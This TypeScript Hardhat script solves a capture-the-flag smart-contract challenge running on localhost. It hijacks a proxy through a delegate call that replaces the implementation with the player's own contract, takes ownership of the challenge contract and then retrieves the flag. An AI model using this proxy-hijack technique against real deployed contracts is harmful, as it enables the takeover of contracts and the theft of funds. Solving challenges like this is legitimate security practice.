import { ethers } from "hardhat";

const API_URL = "http://localhost:3000";

async function getChallengeDetails(): Promise<ChallengeDetails> {
  const data = await fetch(`${API_URL}/challenge`);
  return (await data.json()) as ChallengeDetails;
}

async function getFlag(): Promise<{ flag: string }> {
  const data = await fetch(`${API_URL}/challenge/solve`);

  return (await data.json()) as { flag: string };
}

async function main() {
  const details = await getChallengeDetails();

  const player_wallet = new ethers.Wallet(
    details.player_wallet.private_key,
    ethers.provider
  );

  console.log("Attach to challenge contract");
  const challenge_contract = await ethers.getContractAt(
    "MonkeingAround",
    details.contract_address,
    player_wallet
  );

  console.log("getting address of proxy contract");
  const proxy_address = await challenge_contract.allowlisted(0);
  const solveFactory = await ethers.getContractFactory(
    "SolveContract",
    player_wallet
  );

  console.log("Deploy solve contract");
  const solveContract = await solveFactory.deploy();

  const ABI = ["function init(address,bytes)", "function solve(address)"];
  // Build out the ABI encoded data to call the init function to change proxy
  // implementation address
  const iface = new ethers.Interface(ABI);
  const call1 = iface.encodeFunctionData("init", [
    await solveContract.getAddress(),
    "0x",
  ]);

  // Call the contract with a delegate call against the proxy to change the
  // implementation address
  console.log("Changing proxy implementation address");
  await challenge_contract.doSomeMonkeMath(proxy_address, call1);

  // Create abi encoded data to now call our solve contract to execute in the
  // context of the challenge contract
  const call2 = iface.encodeFunctionData("solve", [player_wallet.address]);
  // Perform the same call except now the logic is our controlled address which
  // should change the owner of the contract
  console.log("Changing owner");
  await challenge_contract.doSomeMonkeMath(proxy_address, call2);

  console.log(await getFlag());
}

type ChallengeDetails = {
  name: string;
  description: string;
  status: string;
  player_wallet: {
    address: string;
    private_key: string;
    balance: string;
  };
  contract_address: string;
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
